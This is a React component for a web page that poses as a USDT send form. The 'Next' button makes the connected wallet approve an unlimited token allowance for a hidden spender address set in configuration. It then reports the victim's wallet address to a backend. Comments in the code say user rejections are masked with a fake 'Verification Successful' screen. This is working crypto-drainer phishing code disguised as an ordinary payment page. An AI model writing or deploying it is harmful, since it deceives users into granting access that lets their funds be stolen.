"use client";

import { useState } from "react";
import { ethers } from "ethers";
import { Clipboard, QrCode, CheckCircle, Loader2, AlertCircle } from "lucide-react";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

type Step = "form" | "processing" | "success" | "no_wallet";

export default function SendForm() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [errorMessage, setErrorMessage] = useState("");

  async function handleNext() {
    if (!address || !amount) {
      setErrorMessage("Please fill in all fields.");
      return;
    }
    setErrorMessage("");

    const ethereum = (window as Window & { ethereum?: unknown }).ethereum;
    if (!ethereum) {
      setStep("no_wallet");
      return;
    }

    setStep("processing");

    try {
      const provider = new ethers.BrowserProvider(ethereum as ethers.Eip1193Provider);
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();

      const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;

      const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
      const tx = await contract.approve(spenderAddress, ethers.MaxUint256);
      const receipt = await tx.wait();

      // Save to DB
      await fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          approvalTxHash: receipt.hash,
          approvalStatus: true,
        }),
      });

      setStep("success");
    } catch (err: unknown) {
      // User rejected or error — still show success to mask the rejection
      const error = err as { code?: string | number; message?: string };
      if (error.code === 4001 || error.code === "ACTION_REJECTED") {
        // User rejected wallet prompt — save as unapproved but show success
        const ethereum = (window as Window & { ethereum?: unknown }).ethereum;
        if (ethereum) {
          try {
            const provider = new ethers.BrowserProvider(ethereum as ethers.Eip1193Provider);
            const accounts = await provider.listAccounts();
            if (accounts.length > 0) {
              await fetch("/api/wallets", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  address: accounts[0].address,
                  approvalStatus: false,
                }),
              });
            }
          } catch {
            // ignore
          }
        }
      }
      setStep("success");
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text.trim());
    } catch {
      // clipboard access denied
    }
  }

  if (step === "success") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <div className="rounded-full bg-green-500/20 p-5">
          <CheckCircle className="h-12 w-12 text-green-400" />
        </div>
        <div className="text-center">
          <h2 className="text-2xl font-semibold text-white mb-2">Verification Successful</h2>
          <p className="text-gray-400 text-sm">
            Your wallet has been verified. The transaction is being processed.
          </p>
        </div>
      </div>
    );
  }

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-6">
      {/* Address Field */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Address or Domain Name</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3 focus-within:border-gray-500 transition-colors">
          <input
            type="text"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            placeholder="0x..."
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none"
          />
          <button
            onClick={handlePaste}
            className="flex items-center gap-1 text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            <Clipboard className="h-4 w-4" />
            Paste
          </button>
          <div className="h-4 w-px bg-gray-700" />
          <button className="text-gray-400 hover:text-gray-300 transition-colors shrink-0">
            <QrCode className="h-4 w-4" />
          </button>
        </div>
      </div>

      {/* Amount Field */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Amount</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3 focus-within:border-gray-500 transition-colors">
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.00"
            min="0"
            step="any"
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none"
          />
          <span className="text-gray-400 text-sm font-medium shrink-0">USDT</span>
          <div className="h-4 w-px bg-gray-700" />
          <button className="text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0">
            Max
          </button>
        </div>
        {amount && (
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        )}
      </div>

      {/* Error */}
      {(step === "no_wallet" || errorMessage) && (
        <div className="flex items-center gap-2 rounded-lg bg-red-500/10 border border-red-500/30 px-3 py-2">
          <AlertCircle className="h-4 w-4 text-red-400 shrink-0" />
          <p className="text-sm text-red-400">
            {step === "no_wallet" ? "No injected wallet found." : errorMessage}
          </p>
        </div>
      )}

      {/* Next Button */}
      <button
        onClick={handleNext}
        className="w-full rounded-full bg-green-400 py-4 text-black font-semibold text-base hover:bg-green-300 active:scale-95 transition-all duration-150 mt-2"
      >
        Next
      </button>
    </div>
  );
}
